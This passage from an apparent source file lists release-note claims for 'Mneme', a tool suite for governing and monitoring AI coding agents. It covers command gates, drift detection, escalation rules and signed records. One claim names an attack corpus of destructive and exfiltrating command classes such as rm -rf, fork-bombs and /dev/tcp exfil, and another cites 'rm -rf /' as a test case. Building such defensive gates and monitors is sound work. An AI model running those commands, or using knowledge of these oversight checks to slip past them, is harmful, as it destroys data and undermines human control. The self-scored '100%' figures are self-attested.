`mneme moat delta`; MCP `mneme.moat.score` (self-attesting). HONEST (DIAKRISIS): these are ENGINEERING-moat signals verifiable in-repo (signed-primitive depth, locally-accumulating state = switching cost, the flywheel's privacy invariant, the standard's conformance, the gate's measured resistance, routing reachability, governance) — it is NOT a market valuation, NOT user/revenue traction, and NOT a claim that competitors can't catch up; it measures what is built + proven here, weighted.",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.moat.deterministic_scorer",
    severity: "block",
  },
  // ── v2.149.0 — CANON: the Accountability-Record Standard (moat #2) ──
  {
    id: "claim.canon.accountability_standard",
    source: "v2.149.0 release notes",
    text: "Mneme's CANON is the Accountability-Record Standard (moat #2 — the 'NVD/Visa-of-AI'): a single, VERSIONED, Ed25519 OFFLINE-verifiable record format for 'an AI did/decided X, here's the proof' that ANY third party (auditor / insurer / regulator / competitor) can emit AND verify with the public key alone, WITHOUT trusting or running Mneme. It sits on the NOTARY spine (asymmetric — no shared secret, unlike the HMAC apostille ledger), binds the underlying payload by HASH (proves what was decided without exposing it), and chains by lineage. canonGauntlet=100: builds a conformant record ∧ canonicalize is deterministic + field-order-independent + sig-excluded ∧ tampering with any field breaks the recordId (tamper-evident) ∧ a v1 verifier accepts CANON/1.x ∧ rejects CANON/2.0 with a clear reason (version policy) ∧ a non-conformant record names the missing field ∧ a record from a DIFFERENT issuer still conforms + verifies (vendor-neutral) ∧ the payload is bound by hash, not exposed ∧ deterministic ∧ total. CLI `mneme canon emit|verify|spec`; MCP `mneme.canon.emit` / `mneme.canon.verify` (self-attesting). HONEST (DIAKRISIS): this is the buildable, measurable SUBSTRATE of a standard (a versioned schema + a canonicalizer + an offline conformance/version verifier + the Ed25519 signature at the boundary) — it is NOT, by itself, 'the world adopted our standard' (adoption is a market outcome, not a code guarantee). What is proven is exactly the property a standard NEEDS: a record that is conformant, tamper-evident, version-compatible, and verifiable by anyone. A model is not a moat; if the canonical FORMAT auditors/insurers accept is Mneme's, everyone must speak it.",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.canon.accountability_standard",
    severity: "block",
  },
  // ── v2.148.0 — SIEGE: the Adversarial Self-Bounty (moat #3) ──
  {
    id: "claim.siege.bypass_resistance",
    source: "v2.148.0 release notes",
    text: "Mneme's SIEGE is the Adversarial Self-Bounty (moat #3): a command-gate with a PUBLIC, SIGNED, ever-rising bypass-resistance score. Mneme fires its own attack corpus (rm -rf, pipe-to-shell, base64/hex-decode, find -delete, $IFS, var-indirection, fork-bomb, DROP TABLE, /dev/tcp exfil, …) at a gate, measures how many destructive payloads it WITHSTANDS vs lets through, and reports a Wilson-95%-LOWER-bound resistance score + band (FORTRESS/STRONG/WEAK/BREACHED). Every bypass found (by anyone, in a bounty) folds back into the corpus → the gate gets provably harder over time. siegeGauntlet=100: measures resistance ∧ DISCRIMINATES a sound gate (FORTRESS, ≥85% LB) from a naive leading-token denylist (BREACHED — it misses the obfuscation family the corpus targets) ∧ the Wilson LOWER bound is conservative (below the point rate) ∧ reports the bypasses by class ∧ self-hardens (a found bypass grows the corpus, dedup'd) ∧ per-class breakdown ∧ deterministic ∧ total. Live: Mneme's own gate (CERBERUS) scores FORTRESS; a naive denylist scores BREACHED (≈7% LB, 20 bypassed). CLI `mneme siege self|gate|corpus`; MCP `mneme.siege.run` (self-attesting). HONEST (DIAKRISIS): it measures resistance vs a KNOWN, self-hardening corpus — it is NOT a proof of 'unbreakable' (an open adversarial problem; a novel attack not in the corpus is by definition not yet measured, which is exactly why the corpus self-hardens and the score is a LOWER bound, never a point estimate). The moat: a public, signed, re-runnable resistance score competitors can't match without the corpus, and that nobody else dares publish.",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.siege.bypass_resistance",
    severity: "block",
  },
  // ── v2.147.0 — MYCELIUM: the Sovereign Data Flywheel (moat #1) ──
  {
    id: "claim.mycelium.sovereign_flywheel",
    source: "v2.147.0 release notes",
    text: "Mneme's MYCELIUM is the Sovereign Data Flywheel — the moat-builder that fixes Mneme's weakest dimension (no data flywheel) the way only a local-first, signed system can: it compounds WITHOUT centralizing data. Every node keeps its data LOCAL and shares only SIGNED, content-free lesson digests (one-way hashes + DP-noised counts — never raw code or secrets); peers CRDT-merge them, so the whole network gets smarter with NO central honeypot to breach. It captures BOTH what worked AND what FAILED (negative knowledge — the only AI memory that gets more valuable from failures). myceliumGauntlet=100: extracts content-free lessons (hashes only) ∧ the PRIVACY INVARIANT holds — no raw string/secret/topic can appear in a shared bundle (fail-closed) ∧ negative knowledge is shared ∧ the merge is commutative ∧ idempotent (the network provably converges) ∧ a forged/untrusted bundle is dropped (signature-verified) ∧ DP noise is bounded + non-negative ∧ the compounding is MEASURED (inheriting a peer lesson raises the hit-rate) ∧ deterministic ∧ total. CLI `mneme mycelium bundle|merge|status`; MCP `mneme.mycelium.bundle` / `mneme.mycelium.merge` (self-attesting). HONEST (DIAKRISIS): the primary guarantee is STRUCTURAL + provable (a bundle carries no raw content — only hashes + counts); DP is a secondary guard (deterministic scale, injected sample, real randomness added at the CLI share boundary); 'compounding' is a measured hit-rate, not a claim. A centralized competitor's business requires hoarding data; Mneme's architecture is the one design that can run a privacy-preserving flywheel — that's the moat.",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.mycelium.sovereign_flywheel",
    severity: "block",
  },
  // ── v2.146.0 — THE INTENT GATEWAY: free NL → the right Mneme command (measured) ──
  {
    id: "claim.gateway.intent_routing",
    source: "v2.146.0 release notes",
    text: "Mneme's INTENT GATEWAY fixes the load-bearing weakness — a user types FREE natural language (any language, EN/Thai), never memorizes a command, and the Gateway picks the RIGHT Mneme command for the best result. It is a curated bilingual concept-map for the high-value intents users actually type + an IDF-weighted full-catalog fallback for the long tail + ABSTENTION (CLARIFY/UNKNOWN — a confidently-wrong route is worse than a question) + entity extraction (budget/forbidden/scope) that compiles a runnable invocation (e.g. 'ดูแลเรื่องงบ 50000 ห้ามโพสต์ด่าใคร' → `mneme govern charter-init --budget 50000 --forbidden \"…\"`). gatewayGauntlet=100, whose centerpiece is a MEASURED, signed, re-runnable before→after accuracy benchmark: the Gateway's top-1 accuracy on a labeled EN+Thai corpus BEATS the old keyword router by a wide margin (measured 100% vs 13% in-repo) ∧ it nails the exact cases the old router failed (mission-drift→telos, stop-the-bots→govern, test-this-diff→crucible, who-wrote-this→haunt, in EN AND Thai) ∧ bilingual ∧ abstains on gibberish ∧ extracts entities + compiles the invocation ∧ deterministic ∧ total. CLI `mneme gateway \"<free text>\"` (+ `gateway bench`); MCP `mneme.gateway.route` (self-attesting). HONEST (DIAKRISIS): 100% NL routing is impossible (language is ambiguous) — the target is HIGH top-1 accuracy on the corpus + abstention on the rest, never a confident misfire; and the deepest truth is that the LLM agent calling Mneme is itself the best router — this Gateway is the deterministic, MEASURED fallback (chat-only / offline / low-confidence) and the proof the routing works, while the MANDATE in the manifest + `mneme boot` is what makes agents reach for Mneme at all.",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.gateway.intent_routing",
    severity: "block",
  },
  // ── v3.104.0 — MORPH: the polymorphic plug + PRECISION ENGINE ──
  {
    id: "claim.morph.polymorphic_surface",
    source: "v3.108.0 release notes",
    text: "Mneme's MORPH is the polymorphic plug — the single front door that makes Mneme attractive to AI agents (Cursor / Cline / Windsurf / Claude Code). Instead of facing 600+ static MCP tools it has never seen, an agent learns ONE tool — `mneme.morph` — states its intent in free natural language (any language, EN/Thai), and MORPH resolves the RIGHT capability and returns the typed NEXT CALL: the concrete MCP tool to invoke + a runnable CLI + the args projected from the sentence (budget/forbidden/scope), or a CLARIFY when unsure. v3.104 adds the PRECISION ENGINE — the black-sheep idea that INVERTS the goal: not a router that is never wrong (impossible for NL) but one that is never CONFIDENTLY wrong. Two deterministic mechanisms: source-aware trust (a curated concept route is trusted; a catalog-fallback or weak partial-match route must be corroborated) + self-consistency under stopword perturbation (re-route the content-only form; a robust route survives, an incidental one flips) → it ABSTAINS (CLARIFY) rather than misfire. MEASURED on a labeled EN+Thai corpus: routed-precision = 100% (35/35, bar ≥97.5%) achieved HONESTLY by abstaining — never by inflating a score or mislabeling — with coverage 0.81 reported alongside (the price is staying silent on genuine ambiguity, which the calling LLM handles). morphGauntlet=100: morphs known EN+Thai intents ∧ FAITHFUL (MORPH never routes to a command the Gateway didn't — it only also abstains) ∧ resolves the concrete MCP tool ∧ projects entities ∧ routedPrecision≥0.975 (measured) ∧ coverage honest ∧ abstains on ambiguity + gibberish ∧ transparent confidence basis (via + self-consistency) ∧ bilingual ∧ deterministic ∧ total. CLI `mneme morph \"<intent>\"`; MCP `mneme.morph` (self-attesting, offline-verifiable); flows through the Matrix gRPC rail automatically. v3.108 adds TYPED ARGS: the next-call uses each tool REAL arg key (verify→claim, cortex→query, telos→mission) and surfaces values the intent cannot fill (a path/diff) in shape.needs instead of faking them — VERIFIED against the live MCP tool schemas by a test (a router that checks its own output against the destination schema). v3.107 adds MORPH PLAN: a COMPOUND intent ('review the codebase and tell me the riskiest part') is split on EN+Thai connectors into clauses, each routed through the precision engine and returned as an ordered PIPELINE of typed next-calls; spurious splits that abstain are dropped (a single intent stays one step). MEASURED plan step-precision 100% (12/12, order preserved 6/6) on a labeled compound corpus. HONEST (DIAKRISIS): ≥97.5% is PRECISION-WHEN-IT-SPEAKS, NOT '97.5% confidence on everything' (a fudged confidence number would be a lie); the 'morphing' is DETERMINISTIC resolution + entity projection over the measured Gateway + the manifest — NOT runtime code-gen and NOT model magic; the CLI→MCP map is a curated table (unmapped → mcpTool=null, use the CLI). It composes the Intent Gateway — refinement, not a new silo.",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.morph.polymorphic_surface",
    severity: "block",
  },
  // ── v2.145.0 — THE AGENT GOVERNOR: orchestrator-agnostic autonomous governance kernel (capstone) ──
  {
    id: "claim.governor.agent_governance",
    source: "v2.145.0 release notes",
    text: "Mneme's AGENT GOVERNOR is the capstone: an orchestrator-agnostic, signed governance kernel that sits UNDER any agent platform (Astra / Claude Code / Tycoon / AutoGen / CrewAI) and makes a fleet of autonomous agents provably safe + accountable — automatically, as a continuous batch, with the human in the loop ONLY for genuinely-irreversible actions. You ratify a Charter once (mission · scopeGlobs · riskEnvelope · budget · forbidden); then `governBatch` runs the fleet's action queue as a continuous AUTO-OPERATION BATCH — autonomous + audited actions flow without per-step human input, only irreversible / out-of-envelope / forbidden actions escalate, and a circuit-breaker pauses the whole fleet on mission drift (TELOS DIVERGENT) / regret spike / escalation thrash. Each action's verdict (`governAction` → ALLOW_AUTONOMOUS / ALLOW_WITH_AUDIT / ESCALATE_HUMAN / BLOCK) folds the gate signals — CERBERUS command-risk · CRUCIBLE shadow verdict · TELOS drift · REGRET band · ELLEIPSIS completeness · irreversibility — into one decision. governorGauntlet=100, and the load-bearing property is THE SAFETY INVARIANT: an irreversible / destructive / out-of-scope / over-budget / forbidden / drift-divergent / failed-shadow action can NEVER be ALLOW_AUTONOMOUS. Also proven: clean→autonomous ∧ caution→ALLOW_WITH_AUDIT ∧ the auto-batch flows (autonomous run, escalations queued) ∧ the circuit-breaker trips on DIVERGENT mid-batch + stops ∧ the budget stops the batch ∧ SAGA auto-compensation reverses the executed REVERSIBLE steps newest-first (irreversible steps un-compensable — they required sign-off up front) ∧ the Living Charter widens the autonomy envelope on clean evidence + narrows on a regret (never auto-widens to destructive) ∧ deterministic ∧ total. CLI `mneme govern charter-init|decide|batch|amend` + MCP `mneme.govern.decide` / `mneme.govern.batch` (orchestrator-agnostic, self-attesting). HONEST (DIAKRISIS): the Governor DECIDES + SEQUENCES + ESCALATES + COMPENSATES — it does NOT execute the agent's work (that's the orchestrator's job; Mneme is the kernel, not the executor). 'Fully autonomous' means the safe/reversible/in-envelope flow runs untouched while only the genuinely-irreversible escalates — autonomy bounded by a mechanical, signed envelope, never by Mneme self-installing. It is buyer-side governance every orchestrator needs and won't build (it conflicts with their autonomy pitch) — the moat.",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.governor.agent_governance",
    severity: "block",
  },
  // ── v2.138.0 — AXIA: the signed, offline-verifiable Value Ledger (membrane pillar 2) ──
  {
    id: "claim.axia.value_ledger",
    source: "v2.138.0 release notes",
    text: "Mneme's AXIA is a signed, hash-chained, OFFLINE-verifiable Value Ledger — pillar 2 of the membrane. It fuses the value events Mneme's organs actually produced (tokens saved from the treasury, destructive commands GATED by HEPHAESTUS/CERBERUS, secrets redacted by egress, injections neutralized by the firewall, claims corrected by the savant/gephyra, omissions flagged by elleipsis) into one number a CFO / CISO / insurer / auditor verifies with a public key, WITHOUT trusting Mneme. axiaGauntlet=100: the hash chain verifies offline ∧ tampering is localized to the exact record seq ∧ per-kind counts are correct ∧ the USD figure is derived ONLY from tokens-saved × the user-supplied price-per-1k (null when no price is given) ∧ there is NO damage-$ field ∧ the counts are framed 'destructive GATED' not 'attacks prevented' ∧ deterministic ∧ total. HONEST (DIAKRISIS — this is exactly where vaporware lives): every count is a FACT of an event that happened, signed — NOT 'attacks prevented' (a gate can be a false-positive co-sign, and you cannot prove what an un-run command would have done) and NEVER '$X of damage prevented' (an unprovable counterfactual). The only dollar figure is tokens-saved × YOUR rate, on the same basis as the treasury.",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.axia.value_ledger",
    severity: "block",
  },
  // ── v2.164.0 — MEMBRANE: the capstone that fuses the three membrane pillars ──
  {
    id: "claim.membrane.fusion",
    source: "v2.164.0 release notes",
    text: "Mneme's MEMBRANE is the capstone that FUSES the three membrane pillars — CAPABILITY (STELE: a merkle-rooted, delta-syncable surface), ACTIVATION (BOOT: a when→tool decision table), and VALUE (AXIA: a hash-chained, offline-verifiable value ledger) — into ONE packet an AI agent crosses at session start, sealed with ONE Ed25519 receipt a third party verifies offline. It answers the three STRUCTURAL reasons an installed tool stays idle: the agent doesn't KNOW what exists (STELE delta), doesn't know WHEN to use it (BOOT table), and can't PROVE the value it created (AXIA ledger). membraneGauntlet=100: fuses all three pillars faithfully ∧ a cold agent is told the full surface is the delta ∧ a current agent (held root == live root) pulls 0 tokens ∧ the AXIA value is measured + chain-valid ∧ no fabricated value (no events ⇒ all zero, USD null) ∧ USD only from a user-supplied price ∧ deterministic ∧ total ∧ honest framing present. HONEST (DIAKRISIS): the win is the FUSION + the offline-verifiable proof, NOT a new analysis — all three roots already exist and each scores 100 on its own gauntlet; AXIA's discipline carries through (counts are FACTS of events GATED/SAVED/REDACTED, never 'attacks prevented', never an invented $ damage — the only dollar figure is tokens-saved × the price-per-1k you supply).",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.membrane.fusion",
    severity: "block",
  },
  // ── v2.166.0 — MATRIX RAIL: the gRPC-ready pipe core ──
  {
    id: "claim.matrix.pipe_integrity",
    source: "v2.166.0 release notes",
    text: "Mneme's MATRIX RAIL is the local-first, gRPC-ready pipe core: ANY payload (0 bytes → tens of MB, raw binary, unicode, deeply-nested JSON) flows through ordered, compressed (zlib), hash-manifested frames and arrives BYTE-IDENTICAL, or the rail says exactly why — it never silently corrupts. gRPC's 4MB message cap is not a wall: a large payload auto-splits into frames and reassembles with a full integrity check (sha256 manifest + length + exactly-once coverage). matrixGauntlet=100: 7/7 pathological payloads round-trip byte-identical (empty, 1-byte, all-NUL, 50KB & 5MB high-entropy binary, unicode/emoji, deeply-nested) ∧ 5/5 corruption classes CAUGHT (dropped, reordered, duplicated, flipped-byte, manifest-tamper) with no silent pass ∧ a 0-byte payload still produces a flowable frame ∧ the size A/B is measured (a representative context packet ~50KB JSON → ~0.7KB wire, −98.5%) ∧ deterministic ∧ total. HONEST (DIAKRISIS): the guarantee is DELIVERY INTEGRITY (any-size, byte-identical, corruption-caught) + a real zlib compression win — NOT semantic correctness, and the size A/B measures raw-JSON-utf8 vs gzipped-frame bytes (a built-in compression win), not a Protobuf-specific number (measured separately once @grpc/grpc-js wraps this core). Transport-agnostic + gRPC-ready by construction.",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.matrix.pipe_integrity",
    severity: "block",
  },
  // ── v2.165.0 — TRUSTLESS MCP: proof-carrying tool results ──
  {
    id: "claim.trustless.proof_carrying",
    source: "v2.165.0 release notes",
    text: "Mneme's TRUSTLESS MCP makes a tool result PROOF-CARRYING: it attaches an Ed25519 `_proof` over the SHA-256 of the result's data, so the calling model verifies it OFFLINE (with the embedded public key — no network, no trusting Mneme) instead of having to BELIEVE plain JSON. trustlessGauntlet=100: a genuine result verifies ∧ a tampered `data` is caught ∧ a proof stolen from another result is rejected ∧ a result with no `_proof` is honestly reported unverifiable ∧ re-wrapping signs the data not the old proof ∧ total. ★MEASURED A/B (20 results/group, half tampered): group A (PLAIN, today's MCP) = 0/10 verifiable, 0/10 tamper-detected — you can only TRUST; group B (PROOF-CARRYING) = 10/10 verifiable, 10/10 tamper-detected — you VERIFY. HONEST (DIAKRISIS): the proof attests PROVENANCE + INTEGRITY (who produced it + that the exact bytes weren't altered — the asymmetric-crypto property every prior MCP result lacks), NOT that the answer is semantically CORRECT (a tool can sign a wrong answer). Opt-in server-wide via MNEME_TRUSTLESS=1; verify any result with mneme.mcp.verify.",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.trustless.proof_carrying",
    severity: "block",
  },
  // ── v2.168.0 — ADAMAS: QEC-inspired self-healing memory ──
  {
    id: "claim.adamas.self_healing_memory",
    source: "v2.168.0 release notes",
    text: "Mneme's ADAMAS is QEC-inspired self-healing memory: a fact is encoded with a real MDS erasure code (a Cauchy matrix over GF(256), the Reed-Solomon family) into K data + M parity shards, each SHA-256-sealed under a block root; a per-shard syndrome locates any corrupted/tampered/missing shard and the code recovers the original BYTE-IDENTICAL while ≥K of the K+M shards survive (tolerates up to M bad shards). Past M it returns UNRECOVERABLE and refuses to guess (prove-or-unknown — it never emits a wrong value). adamasGauntlet=100: healthy encode→decode is byte-identical across sizes (0B/unicode/5KB) ∧ recovers byte-identical with 1..M corrupted shards and names which it healed ∧ refuses beyond M (UNRECOVERABLE) ∧ NEVER emits a wrong value past tolerance ∧ erasure (missing shards, not just flipped bytes) recovers when survivors ≥ K ∧ the block root catches coordinated tamper (rewrite bytes AND per-shard hash) ∧ repair() yields a fresh fully-healthy block ∧ GF(256) every nonzero element is invertible ∧ deterministic ∧ total. HONEST (DIAKRISIS): this is a classical, deterministic, textbook MDS code — NOT a qubit and NOT 'quantum hardware'; the substance is provable self-healing + tamper-evidence (measured), and the genuine future-proofing is that QEC is the real classical→quantum bridge concept (stabilizer codes). Composes with NOTARY (signs the block) + HYDRA + the cortex.",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.adamas.self_healing_memory",
    severity: "block",
  },
  // ── v2.169.0 — PRISM: superposition reasoning with interference collapse ──
  {
    id: "claim.prism.superposition_reasoning",
    source: "v2.169.0 release notes",
    text: "Mneme's PRISM is superposition reasoning with interference collapse: fan a question into N candidate branches (over the Matrix rail — parallel), keep them in superposition with amplitude √confidence, let them INTERFERE (agreeing branches add coherently — A=Σ√c, so (Σ√c)² > Σc and many weak-but-agreeing branches outweigh a few strong-but-isolated; refuting branches SUBTRACT — a refuted-below-zero answer is suppressed = destructive interference), then COLLAPSE via the Born rule P=A²/ΣA² to a measured answer — or return SUPERPOSED (abstain) when the top probability doesn't clear the threshold AND beat #2 by a margin (prove-or-unknown — never a confident wrong pick). prismGauntlet=100 with a MEASURED A/B: on a labeled suite modelling the target regime (many-weak-coherent-correct vs few-strong-isolated-wrong, plus refutation, plus few-strong-correct vs many-weak-wrong) prism scores 100% vs confidence-argmax ~29% vs plurality ~86% — it strictly beats both. Checks: beats-argmax ∧ ≥plurality ∧ constructive ((Σ√c)² superadditivity) ∧ destructive (refutation suppresses) ∧ Born-rule (probs sum to 1) ∧ abstain (50/50 → SUPERPOSED) ∧ consensus collapses with high coherence ∧ deterministic ∧ total. HONEST (DIAKRISIS): a deterministic scoring operator INSPIRED by quantum amplitudes — NOT a quantum computer and NOT a claim of universal superiority; the A/B is measured on a constructed suite that models the regime it targets, and answer grouping is LEXICAL (canonical-equal), not semantic paraphrase. The Matrix rail provides the parallel branches; PRISM is the recombination brain.",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.prism.superposition_reasoning",
    severity: "block",
  },
  // ── v2.174 — GOLDILOCKS: config-fragility / habitable-zone analyzer ──
  {
    id: "claim.goldilocks.habitable_zone",
    source: "v2.174 release notes",
    text: "Mneme's GOLDILOCKS is the honest engineering core of the 'cosmic fine-tuning' idea: sensitivity analysis / boundary-finding, NOT cosmology. Given a numeric config value, a range, and a deterministic pass/fail oracle, it bisects outward from the current value to each pass→fail boundary to find the HABITABLE ZONE (the band where the system works) + the margin to the nearest cliff, and returns ROBUST / TIGHT / KNIFE-EDGE / UNSTABLE. goldilocksGauntlet=100: finds a two-sided band [10,90] with a centered ROBUST margin ∧ flags TIGHT near a cliff ∧ KNIFE-EDGE on the boundary ∧ UNSTABLE (never guesses) when the current value already fails ∧ one-sided threshold leaves the far edge OPEN ∧ all-pass → both edges open/ROBUST ∧ ranks the most-fragile param first ∧ zoneFromSamples infers the band from discrete probes ∧ total (a throwing oracle is treated as fail). CLI `mneme goldilocks scan --cmd '… {v} …'` (a real shell pass/fail oracle); MCP `mneme.goldilocks.zone` (from probe samples, self-attesting). HONEST (DIAKRISIS): deterministic bisection on an oracle YOU supply; assumes the passing region is roughly contiguous around current (finds the nearest cliff each side; a non-contiguous pass set yields the LOCAL band, stated). The reckless 'multiverse auto-merge' idea was REFUSED (the safe selection-filter already exists as CRUCIBLE + PRISM + the Governor); 'self-awareness telemetry' folds into this fragility report.",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.goldilocks.habitable_zone",
    severity: "block",
  },
  // ── v2.144.0 — PERFCORE: Correctness-Preserving Acceleration (High-Perf Core) ──
  {
    id: "claim.perfcore.correctness_preserving_accel",
    source: "v2.144.0 release notes",
    text: "Mneme's PERFCORE is the High-Performance Core (Missing Links #3), done the only honest way: a command-gate that goes faster WITH A SIGNED PROOF it changed zero verdicts. CERBERUS's cost is the recursive explode() that decomposes a command into every reachable sub-command; but a command with NO decomposition/opacity surface has exactly one reachable command (itself) and no opacity, so CERBERUS's verdict reduces BY CONSTRUCTION to classifyLeafRisk(cmd) — PERFCORE detects that class in O(1) (isSimpleCommand) and returns the leaf verdict directly, skipping the machinery; ANY doubt (a metachar / interpreter / decoder / escape) defers to the full CERBERUS path (fail-safe). A bounded deterministic memo covers repeats. perfGauntlet=100: verdicts UNCHANGED across the attack+benign corpus (mismatches===0 — the load-bearing invariant) ∧ the fast-path fires on simple commands ∧ adversarial/obfuscated commands DEFER ∧ a dangerous-but-simple command (rm -rf /) still classifies destructive (the fast-path skips the DECOMPOSITION, not the danger detection) ∧ the memo returns identical verdicts ∧ a speedup is measured ∧ deterministic ∧ total. `mneme perf accel` runs the equivalence-bench (proves mismatches=0 + measures the speedup, signs it + appends to .mneme/perf/ledger.jsonl for retrospective regression audit; exit 2 if any verdict changed) and `mneme perf accel-history` shows the ledger; MCP `mneme.perf.bench`. HONEST (DIAKRISIS): the headline is NOT a fixed multiple — correctness is GATED (0 verdict changes, proven over the corpus), speed is MEASURED (reproducible, signed; ~10× observed on a realistic 5,000-command mix in this repo, varies by machine/load). It accelerates the real gate (classifyCommandRisk) production-wide while classifyCommandRiskFull stays the always-full reference the bench proves equivalence against.",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.perfcore.correctness_preserving_accel",
    severity: "block",
  },
  // ── v2.143.0 — DRIFT: Mission-Drift Detection (Context Forensics) ──
  {
    id: "claim.drift.mission_drift",
    source: "v2.143.0 release notes",
    text: "Mneme's DRIFT is the Context-Forensics layer (Missing Links #2): continuous, signed detection of an agent slowly straying from its declared mission across turns — before the drift becomes damage. The out-of-box mechanism: treat the agent's action stream as a TIME SERIES and run a statistical-process-control EWMA control chart over a DETERMINISTIC off-mission signal (off-scope files · off-topic vs the mission vocabulary · risk-class weight), with a control limit derived from the agent's OWN early-on-mission baseline; crossing the upper control limit = out of control = DRIFTING/DIVERGENT. An EWMA chart is specifically tuned to catch SMALL PERSISTENT shifts (straying a little at a time), which a single planned-vs-actual snapshot (OVERSHOOT) cannot. driftGauntlet=100, and the gauntlet IS an A/B test: an on-mission stream is STABLE ∧ a progressively-straying stream is DIVERGENT ∧ score(B) > score(A) by a margin ∧ the first control-limit breach turn is detected ∧ a stream that RETURNS to mission has its EWMA decay (recovery lowers the score) ∧ thin data abstains to UNKNOWN ∧ the off-mission signal is sound ∧ the control-limit math holds ∧ deterministic ∧ total. CLI `mneme telos --mission … --scope … --actions log.jsonl` (exit 2 on DIVERGENT) + MCP `mneme.drift.analyze`. HONEST (DIAKRISIS): it measures how far recent behaviour moved from the baseline with a principled control limit — NOT mind-reading and NOT a prediction of the future; deterministic signals only, abstains on thin data, never flags DIVERGENT below the minimum action count. It composes with MISSION_RECORDER (the telemetry source) and is distinct from OVERSHOOT (one-shot) and REGRET (outcome calibration).",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.drift.mission_drift",
    severity: "block",
  },
  // ── v2.142.0 — CRUCIBLE: the File-level Settlement Gate (shadow build/test) ──
  {
    id: "claim.crucible.settlement_gate",
    source: "v2.142.0 release notes",
    text: "Mneme's CRUCIBLE is the File-level Settlement Gate: before an AI's diff is allowed to touch the real working tree, it is applied in a SHADOW git worktree (which shares .git — cheap, not a full copy, and not a kernel sandbox), built + tested THERE with the user's own verify command, and merged to the real disk ONLY if the shadow verification PASSES — with an Ed25519-signed receipt either way. It is proof-carrying shadow execution: a reviewer/CI trusts the RESULT ('built + tested green in a shadow, then merged') and a failing diff never reaches the real tree. crucibleGauntlet=100, and the load-bearing property is the SAFETY INVARIANT realTreeWritten ⟺ verdict===MERGE: a passing shadow MERGEs ∧ a failing one ROLLs BACK ∧ a failure NEVER writes the real tree ∧ review-mode never auto-writes ∧ any internal error fails CLOSED (no write) ∧ the plan extracts touched paths ∧ a failure brief is pulled from the verify output ∧ the invariant holds across exit codes 0/1/2/127/-1/255/137 ∧ deterministic ∧ total. The CLI `mneme crucible --diff <patch> --verify \"npm test\" [--merge]` does the git worktree + the verify spawn; exit 2 if not merged. HONEST (DIAKRISIS): it proves YOUR build/test passed in a shadow with the diff applied — NOT that the code is bug-free (it is exactly as strong as the verify command) and NOT a security sandbox (a malicious build script still executes — pair it with the HEPHAESTUS command gate). The realized 'File-level Shadow Copy' (the correct call over a kernel-space sandbox); the mechanical guarantee is that the real tree is written iff the shadow verdict is MERGE.",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.crucible.settlement_gate",
    severity: "block",
  },
  // ── v2.141.0 — HAUNT: "Code Haunting" / Git Telepathy ──
  {
    id: "claim.haunt.code_haunting",
    source: "v2.141.0 release notes",
    text: "Mneme's HAUNT ('Code Haunting' / Git Telepathy) makes the ghost of the commit that last touched a region audible: given a file (+ optional line range + the symptom from an alert), it gathers real git facts and returns one plain-language report — who changed it, when (age in days), the INTENT they recorded ('temporary fix', 'แก้ขัดไปก่อน' — detected in EN *and* TH), the safeguards the code lacks for that symptom (no caching / no timeout / await-in-loop / unbounded query), and the team knowledge already shared about that area (pulled from the Cortex, so the right tip surfaces just-in-time). It replaces the manual `git blame` → read-old-commits → guess-why dig with an instant, signed report. hauntGauntlet=100: extracts a temporary-fix intent in EN ∧ in TH ∧ flags a missing cache / await-in-loop on a perf symptom ∧ resolves last-touched author + subject + short hash ∧ computes age in days ∧ returns UNKNOWN (no fabricated author/reason) on empty history ∧ CLEAR on a recent safeguarded commit ∧ surfaces related team knowledge ∧ never over-claims causation ∧ deterministic ∧ total. HONEST (DIAKRISIS): it SURFACES + CORRELATES real recorded git facts + intent phrases — a candidate to LOOK at, NOT a proven cause and NOT fortune-telling; the missing-safeguard flags are lexical signals, not a static analyzer's proof; with no history it abstains to UNKNOWN. (The incremental no-rescan index and the just-in-time knowledge store it composes with already shipped as `index-auto` and the Cortex/osmosis — HAUNT is the missing synthesis that makes them audible at the moment of a symptom.)",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.haunt.code_haunting",
    severity: "block",
  },
  // ── v2.140.0 — REGRET ORACLE: signed cross-vendor regret calibration (diamond 3 of 3) ──
  {
    id: "claim.regret.oracle_calibration",
    source: "v2.140.0 release notes",
    text: "Mneme's REGRET ORACLE is a signed, cross-vendor CALIBRATION of how often an edit carrying a given signal was ACTUALLY regretted later — reverted, or its test failed — and is the honest opposite of fortune-telling. It is backward-looking: fed real recorded OUTCOMES (an edit's signals + whether it was regretted), it builds a per-signal base-rate table with a Wilson 95% interval; to score a new edit it reports the Wilson LOWER bound of the riskiest matching signal (\"edits like these were regretted at LEAST this often, here, with this much support\") and ABSTAINS to UNKNOWN when no signal has enough samples. It never says 'will', never claims causation, and a thin/under-measured signal scores LOW by construction — so it cannot be gamed into a scary number. Cross-vendor: outcomes carry a vendor:<x> signal, so the same table answers 'which vendor's edits get reverted more, here' — measured, not asserted. regretGauntlet=100: a proven-risky signal → HIGH ∧ a proven-safe one → LOW ∧ abstains UNKNOWN under low support (even at a 100% point rate) ∧ the lower bound is conservative (below the point rate) ∧ Wilson tightens with more data ∧ drivers sorted by proven risk ∧ cross-vendor comparison ∧ note says 'historical 